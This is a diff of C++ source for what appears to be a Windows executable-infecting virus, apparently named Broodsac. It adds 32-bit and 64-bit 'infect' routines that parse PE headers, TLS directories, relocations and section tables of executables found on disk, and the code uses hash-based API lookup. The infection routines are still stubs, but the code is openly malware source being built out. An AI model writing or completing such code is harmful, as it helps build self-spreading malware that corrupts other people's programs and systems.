@@ -104,6 +104,56 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
    return nullptr;
 }
 
+PIMAGE_DOS_HEADER infect_32bit(PIMAGE_DOS_HEADER module)
+{
+   std::uint8_t *byte_module = reinterpret_cast<std::uint8_t *>(module);
+   PIMAGE_NT_HEADERS32 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS32>(byte_module+module->e_lfanew);
+
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
+   {
+      std::wcout << "\t\tExecutable does not have a TLS directory." << std::endl;
+   }
+   else
+   {
+      std::wcout << "\t\tExecutable has a TLS directory." << std::endl;
+   }
+
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
+      std::wcout << "\t\tExecutable has no relocations." << std::endl;
+   else
+      std::wcout << "\t\tExecutable has relocations." << std::endl;
+
+   std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+   IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(byte_module+module->e_lfanew+nt_headers_size);
+
+   return nullptr;
+}
+
+PIMAGE_DOS_HEADER infect_64bit(PIMAGE_DOS_HEADER module)
+{
+   std::uint8_t *byte_module = reinterpret_cast<std::uint8_t *>(module);
+   PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(byte_module+module->e_lfanew);
+
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
+   {
+      std::wcout << "\t\tExecutable does not have a TLS directory." << std::endl;
+   }
+   else
+   {
+      std::wcout << "\t\tExecutable has a TLS directory." << std::endl;
+   }
+
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
+      std::wcout << "\t\tExecutable has no relocations." << std::endl;
+   else
+      std::wcout << "\t\tExecutable has relocations." << std::endl;
+
+   std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+   IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(byte_module+module->e_lfanew+nt_headers_size);
+
+   return nullptr;
+}
+
 int infect(void)
 {
 #if defined(BROODSAC32)
@@ -262,36 +312,32 @@ int infect(void)
 
       IMAGE_DOS_HEADER *dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(exe_buffer);
       IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(exe_buffer+dos_header->e_lfanew);
+      IMAGE_DOS_HEADER *rewritten_image;
 
-      if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+      if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
       {
-         std::wcout << "\tExecutable " << executable << " is not a 64-bit image." << std::endl;
-         goto free_file;
+         std::wcout << "\t" << executable << " is 32-bit." << std::endl;
+         rewritten_image = infect_32bit(dos_header);
+      }
+      else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+      {
+         std::wcout << "\t" << executable << " is 64-bit." << std::endl;
+         rewritten_image = infect_64bit(dos_header);
       }
 
-      if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
+      if (rewritten_image != nullptr)
       {
-         std::wcout << "\tExecutable " << executable << " does not have a TLS directory." << std::endl;
+         CloseHandle(exe_handle);
+         exe_handle = INVALID_HANDLE_VALUE;
       }
-      else
-      {
-         std::wcout << "\tExecutable " << executable << " has a TLS directory." << std::endl;
-      }
-
-      if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
-         std::wcout << "\t\tExecutable has no relocations." << std::endl;
-      else
-         std::wcout << "\t\tExecutable has relocations." << std::endl;
-
-      std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
-      IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(exe_buffer+dos_header->e_lfanew+nt_headers_size);
 
    free_file:
       free(exe_buffer);
       exe_buffer = nullptr;
 
    close_file:
-      CloseHandle(exe_handle);
+      if (exe_handle != INVALID_HANDLE_VALUE)
+         CloseHandle(exe_handle);
       
    end_exe_loop:
       free(found_executables[i]);
